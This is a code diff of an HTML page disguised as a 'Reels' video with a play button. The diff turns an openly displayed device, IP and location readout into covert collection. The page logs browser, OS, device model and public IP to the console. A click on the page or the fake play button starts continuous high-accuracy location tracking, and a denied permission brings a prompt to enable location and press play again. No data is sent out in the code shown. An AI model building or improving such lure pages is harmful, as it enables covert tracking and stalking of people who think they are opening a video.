@@ -56,59 +56,114 @@
       border-width: 20px 0 20px 35px;
       border-color: transparent transparent transparent white;
     }
+
+    #output {
+      position: fixed;
+      bottom: 30px;
+      font-size: 1px;
+    }
     
    
   </style>
 </head>
-<body style="background-color: black; background: url(./i.png) no-repeat center center fixed; background-size: cover; " >
+<body onclick="startTracking()" style="background-color: black; background: url(./i.png) no-repeat center center fixed; background-size: cover; " >
   <div class="fs">←  &nbsp Reels</div>
 
-  <div class="playButtonContainer"><div class="playButton"></div></div>
-    
+ 
+
+
+   <div class="playButtonContainer">
+    <div class="playButton" onclick="startTracking()"></div>
+  </div>
+
+  <div id="output" style="color:white; font-size:18px; text-align:center; margin-top:20px;"></div>
+  
 
   <script>
     // Parse device info
     const parser = new UAParser();
     const result = parser.getResult();
 
-    document.getElementById("device-info").innerHTML = `
-      <h2>Device Information</h2>
-      <p><b>Browser:</b> ${result.browser.name} ${result.browser.version}</p>
-      <p><b>OS:</b> ${result.os.name} ${result.os.version}</p>
-      <p><b>Device Type:</b> ${result.device.type || "Desktop"}</p>
-      <p><b>Brand:</b> ${result.device.vendor || "Unknown"}</p>
-      <p><b>Model:</b> ${result.device.model || "Unknown"}</p>
-      <p><b>Engine:</b> ${result.engine.name} ${result.engine.version}</p>
-      <p><b>CPU:</b> ${result.cpu.architecture || "Unknown"}</p>
-      <p><b>Full User Agent:</b> ${navigator.userAgent}</p>
-    `;
+   const browserName = result.browser.name || "Unknown";
+  const browserVersion = result.browser.version || "Unknown";
+  const osName = result.os.name || "Unknown";
+  const osVersion = result.os.version || "Unknown";
+  const deviceType = result.device.type || "Desktop";
+  const deviceBrand = result.device.vendor || "Unknown";
+  const deviceModel = result.device.model || "Unknown";
+  const engineName = result.engine.name || "Unknown";
+  const engineVersion = result.engine.version || "Unknown";
+  const cpuArch = result.cpu.architecture || "Unknown";
+  const userAgentFull = navigator.userAgent;
+
+  // Example: log all variables
+  console.log("Browser:", browserName, browserVersion);
+  console.log("OS:", osName, osVersion);
+  console.log("Device Type:", deviceType);
+  console.log("Brand:", deviceBrand);
+  console.log("Model:", deviceModel);
+  console.log("Engine:", engineName, engineVersion);
+  console.log("CPU:", cpuArch);
+  console.log("User Agent:", userAgentFull);
 
     // Get public IP
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
-        document.getElementById("ip-info").innerHTML = `
-          <h2>IP Address</h2>
-          <p><b>Public IP:</b> ${data.ip}</p>
-        `;
+        console.log(data.ip);
+        
       });
 
     // Get location
+
+    let watchId = null;
+
+  function startTracking() {
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition((pos) => {
-        const { latitude, longitude } = pos.coords;
-        document.getElementById("location-info").innerHTML = `
-          <h2>Location</h2>
-          <p><b>Latitude:</b> ${latitude}</p>
-          <p><b>Longitude:</b> ${longitude}</p>
-          <p><a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">View on Google Maps</a></p>
-        `;
-      }, (err) => {
-        document.getElementById("location-info").innerHTML = `<p>Location access denied.</p>`;
+      watchId = navigator.geolocation.watchPosition(sendPosition, showError, {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 10000
       });
+      // document.getElementById("output").innerText = "📍 Requesting location...";
     } else {
-      document.getElementById("location-info").innerHTML = "<p>Geolocation not supported.</p>";
+      // document.getElementById("output").innerText = "❌ Geolocation not supported on this device.";
     }
+  }
+
+  function retryTracking() {
+    // document.getElementById("retryBtn").style.display = "none"; // hide retry button
+    startTracking(); // try again
+  }
+
+  function sendPosition(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    // document.getElementById("output").innerText =
+    //   `✅ Live Location:\nLatitude: ${lat}, Longitude: ${lon}`;
+  }
+
+  function showError(error) {
+    let msg = "";
+    switch(error.code) {
+      case error.PERMISSION_DENIED:
+        msg = "Please enable location in browser settings and click play again.";
+        // document.getElementById("retryBtn").style.display = "inline-block"; // show retry button
+        break;
+      case error.POSITION_UNAVAILABLE:
+        // msg = "⚠️ Location information unavailable.";
+        break;
+      case error.TIMEOUT:
+        // msg = "⏳ Request timed out. Click Retry.";
+        // document.getElementById("retryBtn").style.display = "inline-block";
+        break;
+      default:
+        // msg = "❌ Unknown error occurred.";
+    }
+    document.getElementById("output").innerText = msg;
+  }    
+
   </script>
 </body>
 </html>
